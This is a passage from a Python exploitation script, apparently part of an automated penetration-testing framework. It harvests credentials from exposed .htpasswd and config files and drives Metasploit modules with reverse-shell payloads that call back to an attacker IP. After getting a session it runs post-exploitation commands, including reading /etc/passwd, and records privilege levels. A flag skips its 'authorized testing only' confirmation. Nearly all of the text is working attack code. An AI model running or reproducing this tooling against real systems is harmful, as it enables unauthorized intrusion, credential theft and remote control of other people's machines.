                    for match in matches:
                        if match:
                            found_credentials.append({
                                "type": "email",
                                "file": file_url,
                                "credential": match
                            })
                
                # Store file content for analysis
                if any(keyword in file_url.lower() for keyword in ["config", ".htpasswd", ".htaccess"]):
                    evidence["config_files"].append({
                        "url": file_url,
                        "size": len(content),
                        "contains_credentials": len([c for c in found_credentials if c.get("file") == file_url]) > 0
                    })
        
        except Exception as e:
            logger.debug(f"Could not access {file_url}: {e}")
            continue
    
    evidence["discovered_credentials"] = found_credentials
    
    if found_credentials:
        credential_summary = {}
        for cred in found_credentials:
            cred_type = cred.get("type", "unknown")
            if cred_type not in credential_summary:
                credential_summary[cred_type] = 0
            credential_summary[cred_type] += 1
        
        proof = f"Credentials harvested: {dict(credential_summary)}"
        poc = f"curl {found_credentials[0]['file']} | grep -E '(password|user|host)'"
        
        return True, proof, poc, evidence
    
    return False, "", f"curl {base_url}/.htpasswd", evidence

def enhance_metasploit_success_validation(module: str, target: str, port: str, payload: str, attacker_ip: str, attacker_port: str) -> Tuple[bool, str, Dict]:
    """Enhanced Metasploit exploit validation with comprehensive success detection and post-exploit metadata generation."""
    logger.info(f"Enhanced testing of Metasploit module: {module}")
    
    # Select appropriate payload based on module type
    if "http" in module.lower() or "web" in module.lower():
        if "windows" in module.lower():
            payload = "windows/shell_reverse_tcp"
        else:
            payload = "cmd/unix/reverse_bash"
    elif "linux" in module.lower():
        payload = "cmd/unix/reverse_bash"
    elif "windows" in module.lower():
        payload = "windows/shell_reverse_tcp"
    else:
        payload = "cmd/unix/reverse_bash"
    
    # Build comprehensive Metasploit command with post-exploitation commands
    post_exploit_commands = [
        "id",
        "whoami", 
        "pwd",
        "uname -a",
        "cat /etc/passwd | head -10",
        "ps aux | head -10",
        "netstat -an | head -10"
    ]
    
    # Create command that runs exploit and then executes post-exploitation commands
    post_exploit_cmd_string = "; ".join(post_exploit_commands)
    
    msf_script = f"""
use {module}
set RHOSTS {target}
set RPORT {port}
set LHOST {attacker_ip}
set LPORT {attacker_port}
set PAYLOAD {payload}
set ExitOnSession false
exploit -j
sleep 5
sessions -l
sessions -i 1 -c "{post_exploit_cmd_string}"
exit
"""
    
    # Write script to temporary file
    script_file = OUTPUT_DIR / f"msf_script_{target}_{module.replace('/', '_')}.rc"
    with script_file.open("w") as f:
        f.write(msf_script)
    
    # Run Metasploit with script
    msf_cmd = ["msfconsole", "-q", "-r", str(script_file)]
    output, success = run_command(msf_cmd, timeout=300)  # 5 minute timeout
    
    # Enhanced success detection patterns
    success_patterns = [
        "Meterpreter session",
        "Shell session", 
        "Command shell session",
        "Session \\d+ created",
        "Found shell",
        "UID:",
        "uid=",
        "Backdoor service has been spawned",
        "Login Successful",
        "root:",
        "/bin/bash",
        "/bin/sh",
        "Session \\d+ opened"
    ]
    
    exploitation_successful = False
    post_exploit_data = {
        "session_established": False,
        "system_info": {},
        "user_info": {},
        "network_info": {},
        "process_info": {},
        "file_system_access": False,
        "privilege_level": "unknown",
        "post_exploit_commands_output": {}
    }
    
    # Check for successful exploitation
    for pattern in success_patterns:
        if re.search(pattern, output, re.IGNORECASE):
            exploitation_successful = True
            post_exploit_data["session_established"] = True
            logger.info(f"Metasploit exploitation successful with pattern: {pattern}")
            break
    
    if exploitation_successful:
        # Extract post-exploitation information
        
        # Extract user information
        uid_match = re.search(r"uid=(\d+)\(([^)]+)\)", output)
        if uid_match:
            post_exploit_data["user_info"]["uid"] = uid_match.group(1)
            post_exploit_data["user_info"]["username"] = uid_match.group(2)
            post_exploit_data["privilege_level"] = "root" if uid_match.group(1) == "0" else "user"
        
        whoami_match = re.search(r"whoami\s*[\r\n]+([^\r\n]+)", output)
        if whoami_match:
            post_exploit_data["user_info"]["current_user"] = whoami_match.group(1).strip()
        
        # Extract system information
        uname_match = re.search(r"uname -a\s*[\r\n]+([^\r\n]+)", output)
        if uname_match:
            system_info = uname_match.group(1).strip()
            post_exploit_data["system_info"]["full_system_info"] = system_info
            
            # Parse system info
            parts = system_info.split()
            if len(parts) >= 3:
                post_exploit_data["system_info"]["hostname"] = parts[1] if len(parts) > 1 else "unknown"
                post_exploit_data["system_info"]["kernel"] = parts[2] if len(parts) > 2 else "unknown"
                post_exploit_data["system_info"]["architecture"] = parts[-1] if len(parts) > 0 else "unknown"
        
        # Extract current directory
        pwd_match = re.search(r"pwd\s*[\r\n]+([^\r\n]+)", output)
        if pwd_match:
            post_exploit_data["file_system_access"] = True
            post_exploit_data["system_info"]["current_directory"] = pwd_match.group(1).strip()
        
        # Extract process information
        ps_matches = re.findall(r"ps aux.*?[\r\n]+((?:[^\r\n]+[\r\n]+){1,10})", output, re.DOTALL)
        if ps_matches:
            processes = ps_matches[0].strip().split('\n')[:10]
            post_exploit_data["process_info"]["running_processes"] = processes
        
        # Extract network information
        netstat_matches = re.findall(r"netstat -an.*?[\r\n]+((?:[^\r\n]+[\r\n]+){1,10})", output, re.DOTALL)
        if netstat_matches:
            connections = netstat_matches[0].strip().split('\n')[:10]
            post_exploit_data["network_info"]["network_connections"] = connections
        
        # Extract users from /etc/passwd
        passwd_matches = re.findall(r"cat /etc/passwd.*?[\r\n]+((?:[^\r\n]+[\r\n]+){1,10})", output, re.DOTALL)
        if passwd_matches:
            users = passwd_matches[0].strip().split('\n')[:10]
            post_exploit_data["system_info"]["system_users"] = users
        
        # Store command outputs
        for cmd in post_exploit_commands:
            cmd_pattern = f"{re.escape(cmd)}\\s*[\\r\\n]+([^\\r\\n]+)"
            cmd_match = re.search(cmd_pattern, output)
            if cmd_match:
                post_exploit_data["post_exploit_commands_output"][cmd] = cmd_match.group(1).strip()
    
    # Generate POC command
    poc = f"msfconsole -q -x 'use {module}; set RHOSTS {target}; set RPORT {port}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run'"
    
    # Clean up script file
    try:
        script_file.unlink()
    except:
        pass
    
    return exploitation_successful, poc, post_exploit_data

def main():
    """Main function."""
    parser = argparse.ArgumentParser(description="HTTP Exploitation Script")
    parser.add_argument("target", help="Target IP or domain")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--use-rockyou", action="store_true", help="Use rockyou.txt for brute forcing")
    parser.add_argument("--no-confirm", action="store_true", help="Skip confirmation prompts")
    args = parser.parse_args()

    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only!")
        confirm = input("[?] Proceed? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)

    try:
        # Find metadata file
        metadata_file, service = find_metadata_file(args.target)
        
        with metadata_file.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
        
        # Extract port from metadata
        port = metadata.get("port", "80")
        
        # Run exploitation
        exploits = exploit_target(metadata, args.target, port, args.attacker_ip, args.attacker_port, args.use_rockyou)
        
        # Save results
        save_exploit_report(exploits, args.target, port)
        
        logger.info(f"Exploitation complete. Found {len(exploits)} successful exploits.")
        
    except Exception as e:
        logger.error(f"Exploitation failed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()